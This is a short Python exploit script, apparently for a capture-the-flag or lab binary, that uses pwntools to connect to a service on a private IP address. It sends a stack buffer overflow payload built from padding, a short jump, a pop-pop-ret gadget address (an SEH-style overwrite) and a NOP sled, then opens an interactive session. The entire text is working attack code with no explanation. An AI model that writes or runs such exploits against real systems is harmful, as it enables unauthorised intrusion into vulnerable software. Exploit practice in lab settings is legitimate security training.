from pwn import *
p = remote("192.168.176.131",1235)
'''
raw_input()
p.recvuntil("something:")
p.send("a"*0x200)
raw_input()
p.close()
'''
p.recvuntil("Input something:")
gadget1 = 0x00401804 # pop pop ret
raw_input("go")
payload = "A"*(0x80+0x34)
payload += "\xEB\x06\x90\x90" + p32(gadget1)
payload += "\x90" * 8
payload = payload.ljust(0x200, "B")
p.sendline(payload)
p.interactive()
p.close()